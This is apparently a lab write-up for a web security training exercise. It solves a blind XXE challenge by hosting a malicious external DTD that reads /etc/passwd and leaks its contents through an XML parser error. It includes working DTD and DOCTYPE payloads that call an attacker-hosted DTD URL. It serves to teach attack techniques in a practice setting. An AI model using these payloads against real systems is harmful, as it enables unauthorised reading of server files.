# Lab: Exploiting blind XXE to retrieve data via error messages

## Lab Description

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/a11f5b41-b0aa-4f6e-9b3c-55c8f3650f36)

## Solution

The application has a product stock check endpoint.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/0eb3787c-a9c5-4c98-903d-39079ce0220e)

The application checks for the stock level of a product by submitting XML to the server.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/13767e0b-bece-4f55-b100-1d1c4362405a)

Go to exploit server and save the following malicious DTD file on your server in the body section and click **"Store"**.

```XML
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
%eval;
%exfil;
```

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/e8379344-d335-44a4-8535-afbd6e7130a9)

Click on **"View exploit"** to view the exploit ourselves and note the URL.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/e7264b04-5aab-46f9-904f-1c4e0c2a8791)

Insert the following external entity definition in between the XML declaration and the `stockCheck` element and resubmit the request.

`<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>`

An error message containing the contents of the /etc/passwd file will be in the response.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/46569179-952a-425b-8691-cadb6239e153)

Getting the `passwd` file solves the lab.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/3fe9dd9d-d683-44fc-8eb6-9d75ad000431)
